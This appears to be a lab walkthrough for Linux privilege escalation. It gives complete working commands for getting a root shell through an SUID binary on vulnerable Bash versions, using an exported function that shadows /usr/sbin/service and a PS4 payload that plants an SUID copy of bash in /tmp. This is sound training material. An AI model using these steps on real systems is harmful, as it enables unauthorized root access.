## 1

SUID(Set-user Identification) and SGID(Set-group identification) are two special permissions that can be set on executable files, and These 
permissions allow the file being executed to be executed with the privileges of the owner or the group. SUID/SGID files can have vulnerabilities 
that can be exploited to gain root shell.

Find all the SUID/SGID executables on the Debian VM:
> find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

The /usr/local/bin/suid-env2 executable is identical to /usr/local/bin/suid-env except that it uses the absolute path of the service executable 
(/usr/sbin/service) to start the apache2 webserver.

Verify this with strings:
> strings /usr/local/bin/suid-env2

In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are 
used instead of any actual executable at that file path.

Verify the version of Bash installed on the Debian VM is less than 4.2-048:
> /bin/bash --version

Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:
> function /usr/sbin/service { /bin/bash -p; }
> export -f /usr/sbin/service

Run the suid-env2 executable to gain a root shell:
> /usr/local/bin/suid-env2




## 2

Note: This will not work on Bash versions 4.4 and above.

When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.

Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version 
of /bin/bash:
> env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2

Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
> /tmp/rootbash -p










